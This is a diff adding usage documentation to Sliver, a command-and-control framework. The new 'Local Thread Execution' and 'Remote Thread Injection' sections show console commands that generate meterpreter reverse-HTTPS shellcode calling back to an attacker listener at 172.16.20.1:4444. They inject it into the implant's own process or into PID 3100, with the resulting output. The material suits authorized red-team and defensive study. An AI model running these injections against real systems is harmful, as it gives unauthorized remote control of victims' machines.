@@ -11,6 +11,34 @@ Sliver can inject payloads into it's own process or optionally use remote thread
 [attacker] <-(mTLS)-> [sliver] -(code injection)-> [remote process]
 ```
 
+## Local Thread Execution
+
+Execute shellcode in the local process:
+
+```
+sliver (NURSING_BEETLE) > msf -lhost 172.16.20.1
+ msf -lhost 172.16.20.1
+[*] Generating meterpreter_reverse_https windows/amd64 -> 172.16.20.1:4444 ...
+[*] Successfully generated payload 207449 byte(s)
+[*] Sending payload -> NURSING_BEETLE
+[*] Sucessfully sent payload
+```
+
+## Remote Thread Injection
+
+Inject shellcode into remote processes:
+
+```
+sliver (NURSING_BEETLE) > inject -pid 3100 -lhost 172.16.20.1
+ inject -pid 3100 -lhost 172.16.20.1
+[*] Generating meterpreter_reverse_https windows/amd64 -> 172.16.20.1:4444 ...
+[*] Successfully generated payload 207449 byte(s)
+[*] Sending payload -> NURSING_BEETLE -> PID: 3100
+[*] Sucessfully sent payload
+```
+
+Sliver also has a built-in `ps` command.
+
 ## Multi-player Mode
 
 Sliver can also execute multiple payloads per connection. This can be helpful if your meterpreter session dies, or if you want to play with friends:
